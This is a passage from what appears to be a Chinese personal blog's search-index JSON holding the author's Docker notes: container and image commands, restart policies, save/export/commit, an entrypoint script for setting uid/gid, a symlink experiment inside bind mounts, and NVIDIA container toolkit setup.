\u53d1\u5e03\u4e86\u7b2c\u4e00\u4e2a\u5e94\u7528<code>rzero/pal</code></p>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>ubuntu: Install Docker Engine on Ubuntu | Docker Docs</p>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#docker-\u547d\u4ee4\u884c","title":"docker \u547d\u4ee4\u884c","text":"","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#container-\u76f8\u5173","title":"container \u76f8\u5173","text":"<p>docker run</p> <ul> <li><code>-it</code>\uff1a\u4ea4\u4e92\u5f0f</li> <li><code>-d</code>\uff1a\u542f\u52a8\u540e\u8fdb\u5165\u540e\u53f0</li> <li><code>--rm</code>\uff1a\u8fd0\u884c\u540e\u5220\u9664</li> <li><code>--name</code></li> <li><code>-p</code>\uff1a\u6620\u5c04\u7aef\u53e3\uff0c\u591a\u4e2a\u7aef\u53e3\u91cd\u590d\u591a\u6b21-p</li> <li><code>-v src:dst</code>\uff1abind mount</li> </ul> <p>\u5220\u9664\u5bb9\u5668\uff0c<code>-f</code>\u7528\u4e8e\u5220\u9664\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668</p> <pre><code>docker rm container\n</code></pre> <p>\u67e5\u770b\u5bb9\u5668\u8f93\u51fa\uff0c<code>-f</code>\u8ddf\u8e2a\u8f93\u51fa</p> <pre><code>docker logs container -f\n</code></pre> <p>\u5bb9\u5668\u8fd0\u884c\u540e\uff0c\u8c8c\u4f3c\u4e0d\u80fd\u4fee\u6539\u6620\u5c04\u7aef\u53e3\u548c\u8def\u5f84\u3002\u53ef\u4ee5\u901a\u8fc7 update \u4fee\u6539 cpu\uff0c\u5185\u5b58\u7b49\u9650\u5236\u3002 \u66f4\u65b0\u5bb9\u5668 restart policy</p> <pre><code>docker update --restart unless-stopped redis\n</code></pre> <p>\u5176\u5b83 \u6307\u5b9a\u7528\u6237\u8fd0\u884c</p> <pre><code>docker run --user &lt;username_or_UID&gt; &lt;image_name&gt;\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#restart","title":"restart","text":"<ul> <li>no<ul> <li>Don't automatically restart the container. (Default)</li> </ul> </li> <li><code>on-failure[:max-retries]</code><ul> <li>Restart the container if it exits due to an error, which manifests as a non-zero exit code. Optionally, limit the number of times the Docker daemon attempts to restart the container using the :max-retries option. The on-failure policy only prompts a restart if the container exits with a failure. It doesn't restart the container if the daemon restarts.</li> </ul> </li> <li>always<ul> <li>Always restart the container if it stops. If it's manually stopped, it's restarted only when Docker daemon restarts or the container itself is manually restarted.</li> </ul> </li> <li>unless-stopped<ul> <li>Similar to always, except that when the container is stopped (manually or otherwise), it isn't restarted even after Docker daemon restarts.</li> </ul> </li> </ul> <pre><code>docker run -d --restart unless-stopped redis\n\ndocker update --restart unless-stopped redis\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u8986\u76d6-entrypoint","title":"\u8986\u76d6 Entrypoint","text":"<p>\u5bf9\u4e8e\u90a3\u4e9b\u6307\u5b9a\u4e86 entrypoint \u4e3a\u7279\u5b9a\u7a0b\u5e8f\uff0c\u5982 python \u7684\u5bb9\u6613\u975e\u5e38\u6709\u7528\uff0c\u53ef\u4ee5\u7528\u4e8e\u4e0a\u53bb\u7ef4\u4fee\u3002</p> <pre><code>docker run -it --rm --name test --entrypoint bash image\n</code></pre> <p>\u5e94\u7528\u573a\u666f\uff1a\u5982\u679c\u5bb9\u5668\u5728\u53cd\u590d\u91cd\u542f\uff0c\u5bfc\u81f4\u65e0\u6cd5 exec \u4e0a\u53bb\u3002\u6b64\u65f6\u5c31\u9700\u8981\u4f7f\u7528\u955c\u50cf\u91cd\u65b0 docker run\uff0c\u7136\u540e\u4fee\u6539 entrypoint \u907f\u514d\u518d\u6b21\u5931\u8d25\u91cd\u542f\u3002</p>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#images-\u76f8\u5173","title":"images \u76f8\u5173","text":"<pre><code>docker images   # \u67e5\u770bimages\ndocker rmi      # \u5220\u9664\ndocker history &lt;image&gt;  # \u67e5\u770b\u955c\u50cf\u5386\u53f2\u8bb0\u5f55\uff08\u4e0d\u540clayer\uff09\n</code></pre> <p>\u91cd\u547d\u540d image</p> <pre><code>docker tag old_image_name:old_tag new_image_name:new_tag\ndocker rmi old_image_name:old_tag\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#saveload-vs-exportimport-vs-commit","title":"save/load vs export/import vs commit","text":"<p>\u603b\u7ed3</p> <ul> <li><code>docker save/load</code>\uff1a\u9002\u7528\u4e8e\u5907\u4efd\u548c\u8fc1\u79fb\u4e00\u4e2a\u6216\u591a\u4e2a\u955c\u50cf\uff0c\u5728\u4e0d\u540c\u7684 Docker \u4e3b\u673a\u4e4b\u95f4\u4f20\u8f93\u3002</li> <li><code>docker export/import</code>\uff1a\u9002\u7528\u4e8e\u5907\u4efd\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e0d\u5305\u62ec\u5b8c\u6574\u7684\u955c\u50cf\u5143\u6570\u636e\u548c\u5386\u53f2\u8bb0\u5f55\u3002</li> <li><code>docker commit</code>\uff1a\u9002\u7528\u4e8e\u521b\u5efa\u57fa\u4e8e\u5bb9\u5668\u5f53\u524d\u72b6\u6001\u7684\u65b0\u955c\u50cf\uff0c\u5305\u542b\u65b0\u7684\u4e00\u5c42 layer</li> </ul> <p>save/load</p> <p>\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u955c\u50cf\u6253\u5305\u6210 tar \u5f52\u6863\u6587\u4ef6\uff0c\u7528\u4e8e\u5907\u4efd\u548c\u4f20\u8f93\u955c\u50cf\u3002 \u8f93\u51fa</p> <pre><code>docker save --output busybox.tar busybox  # \u8f93\u51fa\u5230tar\u6587\u4ef6\ndocker save -o ubuntu.tar ubuntu:lucid ubuntu:saucy  # \u9009\u62e9\u591a\u4e2atag\n\ndocker save myimage:latest | gzip &gt; myimage_latest.tar.gz # \u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u5e76\u4f7f\u7528gzip\u538b\u7f29\ndocker save myimage:latest | zstd &gt; myimage_latest.tar.gz # \u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u5e76\u4f7f\u7528gzip\u538b\u7f29\n</code></pre> <p>\u5bfc\u5165</p> <pre><code>docker load --input=file.tar\n\nzstd -d -c myimage_latest.tar.zst | docker load  # -c \u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\n</code></pre> <p>export/import</p> <p>\u5c06\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u5bfc\u51fa\u4e3a tar \u6587\u4ef6\uff0c\u4f46\u4e0d\u5305\u542b\u955c\u50cf\u7684\u5143\u6570\u636e\u548c\u5386\u53f2\u8bb0\u5f55\u3002</p> <pre><code>docker export -o container_filesystem.tar container_id\n\ndocker import container_filesystem.tar new_image_name:new_tag\n</code></pre> <p>commit</p> <p>\u5c06\u5bb9\u5668\u76ee\u524d\u7684\u66f4\u6539\u4fdd\u5b58\u4e3a\u65b0\u7684\u4e00\u4e2a layer\uff0c\u4ece\u800c\u57fa\u4e8e\u8be5\u65b0\u955c\u50cf\u521b\u5efa\u5176\u5b83\u5bb9\u5668</p> <pre><code>docker commit nginx_base hello_world_nginx   # \u4fdd\u5b58\u4e3ahello_world_nginx\u955c\u50cf\n\ndocker commit --author amit.sharma@sentinelone.com --message 'this is a basic nginx image' nginx_base authored # \u6dfb\u52a0author, message\u4fe1\u606f\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7<code>--change</code>\u4fee\u6539\u539f\u672c\u5bb9\u5668\u7684\u4e00\u4e9b\u914d\u7f6e</p> <ul> <li>CMD</li> <li>ENTRYPOINT</li> <li>ENV</li> <li>EXPOSE</li> <li>USER</li> <li>VOLUME</li> <li>WORKDIR</li> </ul> <pre><code>docker commit --change='CMD [\"nginx\", \"-T\"]' nginx_base conf_dump\n</code></pre> <p>example</p> <pre><code>docker run --entrypoint bash --name test --gpus '\"device=0\"' -u 0:0 -it ghcr.io/k4yt3x/video2x:5.0.0-beta6\n\ndocker commit --author yuanfuya@qq.com --message 'fix interpolate parameter' --change='Entrypoint [\"/usr/bin/python3.8\", \"-m\", \"video2x\"]' test video2x:5.0.0-beta6.2\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#rename","title":"rename","text":"<pre><code>docker tag old_image_name:old_tag new_image_name:new_tag\n\ndocker rmi old_image_name:old_tag\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#docker-compose","title":"docker compose","text":"","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u5347\u7ea7\u955c\u50cf","title":"\u5347\u7ea7\u955c\u50cf","text":"<pre><code>docker compose pull &amp;&amp; docker compose up -d\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#dockerfile","title":"dockerfile","text":"<p>\u521b\u5efa Dockerfile\uff0c\u7ecf\u5e38\u9047\u5230\u56e0\u4e3a\u67d0\u4e00\u6b65\u9519\u8bef\uff0c\u5bfc\u81f4\u53cd\u590d docker build\u3002\u5176\u5b9e\u53ef\u4ee5\u5148\u521b\u5efa\u4e00\u4e2a\u57fa\u7840\u73af\u5883\uff0c\u7136\u540e\u8fdb\u5165\u73af\u5883\u914d\u7f6e\u4e00\u904d\uff0c\u6210\u529f\u540e\u518d\u5199 dockerfile\u3002</p> <p>\u5148\u5982\u4e0b\u642d\u5efa\u4e00\u4e2a\u57fa\u7840\u73af\u5883</p> <pre><code>FROM ubuntu:22.04\n\nRUN apt update\\\n  &amp;&amp; apt install ...\\\n\nCOPY . /app \n</code></pre> <pre><code>docker build -t app .  # .\u8868\u793abuild\u65f6\u7684\u4e0a\u4e0b\u6587\uff0c\u5982\u679cDockerfile\u653e\u5728\u9879\u76ee\u6839\u76ee\u5f55\u7684\u8bdd\u3002COPY .\u4fbf\u8868\u793a\u5c06\u6574\u4e2a\u9879\u76ee\u590d\u5236\u5230\u5bb9\u5668\n</code></pre> <p>\u7136\u540e\u8fdb\u5165\u9879\u76ee\uff0c\u624b\u52a8\u5b89\u88c5\u5269\u4f59\u4f9d\u8d56\uff0c\u76f4\u5230\u6d4b\u8bd5\u80fd\u591f\u8fd0\u884c</p> <pre><code>docker run -it --rm app bash\n</code></pre> <p>\u6700\u540e\u5b8c\u5584 Dockerfile</p>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u4f7f\u7528-entrypointsh-\u811a\u672c","title":"\u4f7f\u7528 entrypoint.sh \u811a\u672c","text":"<p>\u4f7f\u7528 entrypoint \u811a\u672c\u53ef\u4ee5\u5b9e\u73b0\u6839\u636e\u7528\u6237\u8fd0\u884c\u5bb9\u5668\u65f6\u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf\uff0c\u8bbe\u7f6e\u7528\u6237 uid,gid\uff0c\u4ece\u800c\u4fdd\u8bc1\u5bb9\u5668\u548c host \u6587\u4ef6\u6743\u9650\u6b63\u786e\u3002</p> <pre><code>ENTRYPOINT [ \"/parse-and-link/docker/entrypoint.sh\" ]\n</code></pre> <pre><code>#!/bin/bash\n\nPUID=${PUID:-1000}\nPGID=${PGID:-1000}\n\nif [ `id -u abc` -ne $PUID ]; then\n    usermod -u $PUID myuser\nfi\nif [ `id -g abc` -ne $PGID ]; then\n    groupmod -g $PGID abc\nfi\nchown -R abc:abc /parse-and-link\n\nif [ -n \"$JELLYFIN_URL\" ] &amp;&amp; [ -n \"$JELLYFIN_API_KEY\" ] ; then\n    echo \"Jellyfin URL is set to $JELLYFIN_URL\"\n    su abc -c \"python3 run_config.py -c /config.json -m -j $JELLYFIN_URL -k $JELLYFIN_API_KEY\"\nelse\n    su abc -c \"python3 run_config.py -c /config.json -m\"\nfi\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u5176\u5b83\u5c0f-tips","title":"\u5176\u5b83\u5c0f tips","text":"<p>\u6d4b\u8bd5\u7248\u547d\u4ee4</p> <pre><code>docker run -it --rm --name test --entrypoint bash rzero/pal:v1.0\n</code></pre> <p>\u53d1\u5e03\u7248\u547d\u4ee4</p> <pre><code>docker run -d --name pal --restart unless-stopped \\\n  -e JELLYFIN_URL=\"xxxxx\" \\\n  -e JELLYFIN_API_KEY=\"xxxxx\" \\\n  -v ./config/example.docker.json:/config.json \\\n  rzero/pal:v1.0\n</code></pre> <ul> <li>\u4f7f\u7528<code>.dockerignore</code>\u6587\u4ef6\uff0c\u5426\u5219\u6bcf\u6b21\u4fee\u6539 Dockerfile\uff0cCOPY \u4e4b\u540e\u7684\u6b65\u9aa4\u5c31\u90fd\u4e0d\u80fd\u590d\u7528\u4e86</li> </ul>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u53d1\u5e03\u5230-dockerhub","title":"\u53d1\u5e03\u5230 dockerhub","text":"<pre><code>docker login\n\ndocker tag local_image:tag username/repository:tag\ndocker push username/repository:tag\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#docker-\u5b9e\u9a8c","title":"docker \u5b9e\u9a8c","text":"","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u8f6f\u786c\u94fe\u63a5","title":"\u8f6f\u786c\u94fe\u63a5","text":"<p>\u603b\u7ed3</p> <ul> <li>\u8f6f\u94fe\u63a5\u9700\u8981\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u5e76\u4e14 src \u548c dst\uff08\u94fe\u63a5\uff09\u6700\u957f\u76f8\u540c\u8def\u5f84\u7684\u76ee\u5f55\uff0c\u5fc5\u987b\u540c\u65f6\u5b58\u5728\u4e8e docker \u548c host</li> <li>\u786c\u94fe\u63a5\u6ca1\u6709\u4efb\u4f55\u8981\u6c42\uff0c\u6253\u4e0a\u94fe\u63a5\u7684\u4e00\u523b\uff0c\u4efb\u4f55\u5730\u65b9\u5747\u80fd\u8bbf\u95ee\u5230\u8be5\u6587\u4ef6</li> </ul> <p>\u5b9e\u9a8c\uff1a host:</p> <pre><code>\u279c  pwd\n/home/yfy/scripts/test/mnt\n\u279c  tree -L 4\n.\n\u251c\u2500\u2500 Disk1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 links\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Movie\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 aa.mp4 -&gt; ../../Movie/a.mp4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 a.mp4 -&gt; /home/yfy/scripts/test/mnt/Disk1/Movie/a.mp4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 b.mp4   # \u786c\u94fe\u63a5\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Movie\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 a.mp4  # \u539f\u59cb\u6587\u4ef6\n\u251c\u2500\u2500 Disk2\n\u251c\u2500\u2500 outfile -&gt; ../../outfile  # \u8f6f\u94fe\u63a5\u5230docker\u4e2d\u770b\u4e0d\u5230\u7684\u76ee\u5f55\u6587\u4ef6\n\u2514\u2500\u2500 outfile-hl   # \u786c\u94fe\u63a5\n\n5 directories, 7 files\n</code></pre> <p>docker:</p> <pre><code>ubuntu@dfc03804864c \u279c  pwd\n/workspace/mnt\nubuntu@dfc03804864c \u279c  tree -L 4\n.\n|-- Disk1\n|   |-- Movie\n|   |   `-- a.mp4\n|   `-- links\n|       `-- Movie\n|           |-- a.mp4 -&gt; /home/yfy/scripts/test/mnt/Disk1/Movie/a.mp4  (\u65e0\u6cd5\u8bbf\u95ee)\n|           |-- aa.mp4 -&gt; ../Movie/a.mp4  (\u65e0\u6cd5\u8bbf\u95ee)\n|           |-- aaa.mp4 -&gt; ../../Movie/a.mp4  \n|           `-- b.mp4\n|-- Disk2\n|-- outfile -&gt; ../../outfile   (\u65e0\u6cd5\u8bbf\u95ee)\n`-- outfile-hl  (\u65e0\u6cd5\u8bbf\u95ee)\n\n5 directories, 7 files\n</code></pre> <p>\u5728 docker \u548c host \u4e2d\u67e5\u770b outfile-hl \u7684 inode \u53ef\u4ee5\u770b\u5230\u548c\u6e90\u6587\u4ef6 outfile \u662f\u76f8\u540c\u7684</p> <pre><code>\u279c  ls -i ../../outfile\n1091603 -rw-rw-r-- 2 yfy yfy 0 12\u6708  9 16:57 ../../outfile\n\n\u279c  ls -i outfile-hl\n1091603 -rw-rw-r-- 2 yfy yfy 0 12\u6708  9 16:57 outfile-hl\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#gpu","title":"gpu","text":"<pre><code>Error response from daemon: failed to create task for container: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error running hook #0: error running hook: exit status 1, stdout: , stderr: Auto-detected mode as 'legacy'\nnvidia-container-cli: initialization error: nvml error: driver/library version mismatch: unknown\nError: failed to start containers: jellyfin\n</code></pre> <pre><code>[Sat Apr 13 23:38:47 2024] NVRM: API mismatch: the client has the version 535.171.04, but\n                           NVRM: this kernel module has the version 535.161.07.  Please\n                           NVRM: make sure that this kernel module and all NVIDIA driver\n                           NVRM: components have the same version.\n</code></pre>","tags":["docker"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/#nvidia-container-toolkit","title":"nvidia-container-toolkit","text":"<p>nvidia runtime</p> <p>nvidia-container-runtime \u5df2\u7ecf\u88ab nvidia-container-toolkit  \u66ff\u4ee3\u4e86\uff1a NVIDIA/nvidia-container-runtime: NVIDIA container runtime (github.com)</p> <p>\u5b89\u88c5\u6559\u7a0b</p> <p>Installing the NVIDIA Container Toolkit \u2014 NVIDIA Container Toolkit 1.16.0 documentation</p> <p>Configure the container runtime by using the\u00a0<code>nvidia-ctk</code>\u00a0command:</p> <pre><code>sudo nvidia-ctk runtime configure --runtime=docker\n\nsudo systemctl restart docker\n</code></pre>","tags":["docker"]},{"location":"archive/2024/","title":"2024","text":""},{"location":"archive/2023/","title":"2023","text":""},{"location":"archive/2022/","title":"2022","text":""},{"location":"archive/2021/","title":"2021","text":""},{"location":"archive/2020/","title":"2020","text":""},{"location":"archive/2019/","title":"2019","text":""},{"location":"category/%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/","title":"\u6298\u817e\u8bb0\u5f55","text":""},{"location":"category/%E4%B8%AA%E4%BA%BA/","title":"\u4e2a\u4eba","text":""},{"location":"category/%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/","title":"\u535a\u5ba2 &amp; \u7f51\u7edc","text":""},{"location":"category/%E5%8D%9A%E5%AE%A2/","title":"\u535a\u5ba2","text":""},{"location":"category/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/","title":"\u8f6f\u4ef6\u5de5\u5177","text":""},{"location":"category/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/","title":"\u8bfe\u7a0b\u7b14\u8bb0","text":""},{"location":"category/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"\u5b66\u4e60\u7b14\u8bb0","text":""},{"location":"category/%E9%98%85%E8%AF%BB/","title":"\u9605\u8bfb","text":""},{"location":"page/2/","title":"\u535a\u5ba2","text":""},{"location":"page/3/","title":"\u535a\u5ba2","text":""},{"location":"page/4/","title":"\u535a\u5ba2","text":""},{"location":"page/5/","title":"\u535a\u5ba2","text":""},{"location":"archive/2022/page/2/","title":"2022","text":""},{"location":"category/%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/page/2/","title":"\u6298\u817e\u8bb0\u5f55","text":""}]}